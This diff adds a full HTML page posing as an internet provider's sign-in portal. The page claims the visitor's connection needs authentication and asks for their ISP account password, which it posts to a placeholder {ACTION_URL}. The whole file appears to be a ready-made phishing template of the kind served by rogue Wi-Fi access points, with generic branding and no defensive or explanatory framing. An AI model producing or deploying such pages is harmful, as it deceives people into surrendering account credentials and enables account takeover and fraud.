@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ISP Portal - Sign In</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#004d99,#00264d);display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#fff;border-radius:10px;padding:35px 30px;max-width:400px;width:90%;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,.3)}
+.isp-icon{width:60px;height:60px;background:#004d99;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:28px;color:#fff;font-weight:bold}
+h2{color:#1a1a1a;font-size:20px;margin-bottom:4px}
+.sub{color:#777;font-size:13px;margin-bottom:24px;line-height:1.4}
+label{display:block;text-align:left;font-size:13px;color:#555;margin-bottom:4px;font-weight:bold}
+input[type=password]{width:100%;padding:12px 14px;border:2px solid #e0e0e0;border-radius:6px;font-size:15px;margin-bottom:16px;transition:border-color .2s}
+input[type=password]:focus{outline:0;border-color:#004d99}
+button{width:100%;padding:12px;background:#004d99;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer;transition:background .2s}
+button:hover{background:#003366}
+.info{font-size:11px;color:#999;margin-top:16px;line-height:1.4}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="isp-icon">ISP</div>
+<h2>Customer Login Required</h2>
+<p class="sub">Your internet connection requires authentication.<br>Enter your ISP account password to continue.</p>
+<form method="POST" action="{ACTION_URL}">
+<label for="password">ISP Account Password</label>
+<input type="password" id="password" name="password" placeholder="Enter your ISP password" required>
+<button type="submit">Sign In</button>
+</form>
+<div class="info">
+By signing in you agree to the ISP Terms of Service and Privacy Policy.<br>
+&copy; 2026 Internet Service Provider
+</div>
+</div>
+</body>
+</html>
